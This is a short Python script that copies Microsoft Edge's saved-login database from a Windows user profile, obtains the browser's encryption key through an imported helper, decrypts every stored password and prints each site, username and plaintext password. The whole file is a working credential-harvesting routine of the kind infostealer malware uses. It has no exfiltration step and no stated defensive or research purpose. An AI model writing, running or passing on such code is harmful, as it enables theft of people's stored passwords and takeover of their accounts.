import sqlite3
import shutil
import os
import sys
sys.path.insert(0, os.path.dirname(__file__))
from decrypt_edge_cookies import get_edge_key, decrypt_cookie

src = os.path.expanduser(r'~/AppData/Local/Microsoft/Edge/User Data/Default/Login Data')
dst = 'login_tmp.db'
shutil.copy2(src, dst)
key = get_edge_key()

conn = sqlite3.connect(dst)
cur = conn.cursor()
cur.execute("SELECT origin_url, username_value, password_value FROM logins")
for origin, user, enc_pwd in cur.fetchall():
    if enc_pwd:
        try:
            pwd = decrypt_cookie(enc_pwd, key)
            print(f"{origin} | user: {user} | pwd: {pwd}")
        except Exception as e:
            print(f"{origin} | user: {user} | error: {e}")
conn.close()
if os.path.exists(dst):
    os.remove(dst)
